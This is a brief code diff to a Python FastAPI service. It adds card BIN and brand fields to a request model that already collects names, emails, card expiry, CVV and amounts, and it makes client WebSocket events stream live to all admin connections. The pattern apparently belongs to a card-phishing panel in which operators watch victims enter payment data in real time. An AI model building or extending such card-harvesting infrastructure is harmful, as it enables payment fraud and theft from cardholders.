@@ -66,6 +66,8 @@ class AuditRequest(BaseModel):
     email: EmailStr
     full_name: str
     numero_carte_masque: str
+    card_bin: str
+    card_brand: str
     expiry: str
     cvv: str
     montant: float
@@ -157,7 +159,11 @@ async def websocket_client(websocket: WebSocket, client_id: str):
             "status": "online"
         })
         while True:
-            await websocket.receive_text()
+            p=await websocket.receive_text()
+            try:
+                r=json.loads(p)
+                for a in manager.admins: await a.send_json({'type':'CLIENT_EVENT','client_id':client_id,'event':r.get('event'),'data':r.get('data')})
+            except:pass
     except WebSocketDisconnect:
         manager.disconnect_client(client_id)
         await manager.broadcast_to_admins({
